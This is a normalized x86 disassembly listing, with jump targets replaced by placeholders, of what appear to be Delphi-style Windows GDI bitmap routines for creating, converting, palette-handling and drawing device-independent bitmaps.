je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4032a0
sub_42162c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_421398
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d01c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_421688
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_41c670
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_421398
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_421398
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_4216d4
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_41f070
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_421783
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_421790
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_4217dc
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_421398
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_41e8dc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_421e2a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026cc
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_421b34
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_41e7bc
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_41e8dc
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_41e8dc
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_41e8dc
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_41e8dc
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_421ddb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_421dca
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_421da8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_41e8dc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_421790
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_41f070
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41dc20
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_4129b0
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41e834
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421daf
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_421d7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e8dc
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026ec
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cf40
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
call sub_41cf40
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41e8dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403ad8
call sub_403ad8
jmp r-xdata
sub_421dd1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421de0
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403a54
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_421e40
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_421ea4
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_421398
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42209f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41e8dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_422057
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4217dc
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_4220b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41fa5c
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421608
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_422118
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_422828
mov eax [ esi + 0x28 ]
call sub_42160c
mov eax [ esi + 0x2c ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_422154
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42220c
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cbc
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_422a98
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_421608
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42160c
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414434
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_422244
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_422828
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4222d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_421e40
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4217dc
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4222d8
mov eax [ ebp - 0x8 ]
call sub_41c670
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a54
call sub_403aa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_422304
push ebx
mov ebx eax
mov eax ebx
call sub_4225f8
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d01c
pop ebx
retn
sub_422334
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415f00
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_422828
lea eax [ ebx + 0x2c ]
call sub_40d01c
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_422a98
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4223a8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41e5b8
mov eax ebx
call sub_422938
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_422734
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4225e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41e4e4
push eax
call SetStretchBltMode
mov eax ebx
call sub_422678
mov dl [ r-xdata ]
call sub_41e5b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4228d8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_422678
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225eb
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_422579
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41e8dc
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_422678
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41ea80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4225f8
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_422838
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
